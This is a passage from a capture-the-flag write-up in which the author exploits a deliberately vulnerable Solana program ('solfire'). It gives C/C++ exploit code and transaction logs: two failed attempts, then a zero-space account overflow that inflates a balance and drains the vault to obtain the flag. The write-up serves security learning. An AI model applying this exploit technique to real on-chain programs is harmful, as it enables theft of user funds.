    sol_invoke(&instruction, params.ka, params.ka_num);
}
```

Unfortunately this didn't work, apparently you can't call the BPF loader on-chain, which is probably a good thing.

```
Log Messages:
    Program 9ZJuDJj9aSiSTS1rQuZm7F6rS3bzXqHwyFjSrmGECd25 invoke [1]
    Program log: Solution::run
    Program 9ZJuDJj9aSiSTS1rQuZm7F6rS3bzXqHwyFjSrmGECd25 consumed 1458 of 200000 compute units
    Program failed to complete: Program BPFLoaderUpgradeab1e11111111111111111111111 not supported by inner instructions
    Program 9ZJuDJj9aSiSTS1rQuZm7F6rS3bzXqHwyFjSrmGECd25 failed: Program failed to complete
```

I couldn't see any other way of potentially exploiting this bad owner check.

## Account transfer attempt

The next thing that I attempted to do was to see if I could create an account owned by solve program, create a fake balance then transfer the account to the solfire program.

```cpp
#pragma pack(push, 1)
struct NewAccountData
{
	uint32_t enumValue = 0;
	uint64_t lamports;
	uint64_t space;
	SolPubkey owner;
};

struct AssignAccountData
{
	uint32_t enumValue = 1;
	SolPubkey owner;
};
#pragma pack(pop)

void system_create_account(const NewAccountData & ix_data)
{
    uint8_t seed_data[] = { 'A', balances_bump_seed() };
    SolSignerSeed seed = {
        .addr = seed_data,
        .len = SOL_ARRAY_SIZE(seed_data),
    };

    const SolSignerSeeds signers_seeds[] = { 
        { &seed, 1 },
    };

    SolAccountMeta meta[] = {
        // funder:
        { .pubkey = user_account().key, .is_writable = 1, .is_signer = 1 },
        // new_account:
        { .pubkey = balances_account().key, .is_writable = 1, .is_signer = 1 },
    };

    SolInstruction instruction = {
        .program_id = system_account().key,
        .accounts = meta,
        .account_len = SOL_ARRAY_SIZE(meta),
        .data = (uint8_t*)&ix_data,
        .data_len = sizeof(ix_data),
    };

    sol_invoke_signed(&instruction, params.ka, params.ka_num, signers_seeds, 1);
}

void assign_account()
{
    uint8_t seed_data[] = { 'A', balances_bump_seed() };
    SolSignerSeed seed = {
        .addr = seed_data,
        .len = SOL_ARRAY_SIZE(seed_data),
    };

    const SolSignerSeeds signers_seeds[] = { 
        { &seed, 1 },
    };

    SolAccountMeta meta[] = {
        { .pubkey = balances_account().key, .is_writable = 1, .is_signer = 1 },
    };

    AssignAccountData ix_data = {
        .owner = *solfire_account().key
    };

    SolInstruction instruction = {
        .program_id = system_account().key,
        .accounts = meta,
        .account_len = SOL_ARRAY_SIZE(meta),
        .data = (uint8_t*)&ix_data,
        .data_len = sizeof(ix_data),
    };

    sol_invoke_signed(&instruction, params.ka, params.ka_num, signers_seeds, 1);
}
```

Now to actually attempt to do it.

```cpp
uint32_t target = 50'000;
system_create_account(NewAccountData{
    .lamports = 1,
    .space = 10240,
    .owner = *solve_account().key
});

Balance * balances = (Balance*)balances_account().data;
balances->deposits += target;

assign_account();

withdraw(balances_account().key, target, user_account().key, vault_account().key);
```

This was also not successful, which is probably a good thing, if you could do this in Solana you couldn't even trust data you own.

```
Log Messages:
    Program ARtqb4MDgp7aoPU6ev3TNiJuTkKkS49VN23f2onjLfVc invoke [1]
    Program log: Solution::run
    Program 11111111111111111111111111111111 invoke [2]
    Program 11111111111111111111111111111111 success
    Program 11111111111111111111111111111111 invoke [2]
    Program 11111111111111111111111111111111 success
    failed to verify account F7gNn7qAZ9TZNuEus9J3t8Csr1GUzFHMcxeuQJQ16VR2: instruction modified the program id of an account
    Program ARtqb4MDgp7aoPU6ev3TNiJuTkKkS49VN23f2onjLfVc consumed 2576 of 200000 compute units
    Program ARtqb4MDgp7aoPU6ev3TNiJuTkKkS49VN23f2onjLfVc failed: instruction modified the program id of an account
```

I did attempt a few different similar things of allocate, edit then transfer down the similar vain, but it wouldn't let me do it if the data was at all modified.

## Create a new account with no space (The solution)

Finally after all of the different experiments (and many more), I made the realization that if I can create accounts and transfer them, that I could make one which has zero space, and overflow it, which means that the 10k it would treat as the buffer would be the entire padding, leaving us one account two overflow.

So what is stored after that padding?

```c
input += MAX_PERMITTED_DATA_INCREASE;
input = (uint8_t*)(((uint64_t)input + 8 - 1) & ~(8 - 1)); // padding

// rent epoch
params->ka[i].rent_epoch = *(uint64_t *) input;
input += sizeof(uint64_t);
```

So assuming that `data` was already aligned properly and no additional padding outside the `MAX_PERMITTED_DATA_INCREASE` is applied then `withdraws` will align with `rent_epoch` and `deposits` will be the first 8 bytes of the next account data which is.

```cpp
uint8_t dup_info = input[0];
input += sizeof(uint8_t);

if (dup_info == UINT8_MAX) {
    // is signer?
    params->ka[i].is_signer = *(uint8_t *) input != 0;
    input += sizeof(uint8_t);

    // is writable?
    params->ka[i].is_writable = *(uint8_t *) input != 0;
    input += sizeof(uint8_t);

    // executable?
    params->ka[i].executable = *(uint8_t *) input;
    input += sizeof(uint8_t);

    input += 4; // padding
```

So as long as the next account after (which is recipient) exists and atleast has a writable flag set then we'll be above the 50k balance (50k = 0xC350)

So let's give it a shot
```cpp
uint32_t target = 50'000;
uint32_t balance_index = 640;
system_create_account(NewAccountData{
    .lamports = 1,
    .space = 0,
    .owner = *solfire_account().key
});

withdraw(balances_account().key, target, user_account().key, vault_account().key, balance_index);
```

Now after all of this
```
  Log Messages:
    Program Fk4FvFrUSwDGE15qaC8gd4WvvLbHNLSjZht6h5A32sit invoke [1]
    Program log: Solution::run
    Program 11111111111111111111111111111111 invoke [2]
    Program 11111111111111111111111111111111 success
    Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn invoke [2]
    Program log: Solfire start
    Program log: handle_withdraw
    Program 11111111111111111111111111111111 invoke [3]
    Program 11111111111111111111111111111111 success
    Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 44331 of 197472 compute units
    Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn success
    Program Fk4FvFrUSwDGE15qaC8gd4WvvLbHNLSjZht6h5A32sit consumed 46863 of 200000 compute units
    Program Fk4FvFrUSwDGE15qaC8gd4WvvLbHNLSjZht6h5A32sit success
==================================================

user bal: 50009
vault bal: 950000
congrats!
flag: "my_flag_here"
```

## Closing thoughts

This is my first time working with Solana and crypto-currency programming/security.

I would recommend anyone writing crypto currency programs get them security reviewed by a professional. (e.g. [OtterSec](https://osec.io/) which the Author of the Challenge owns)
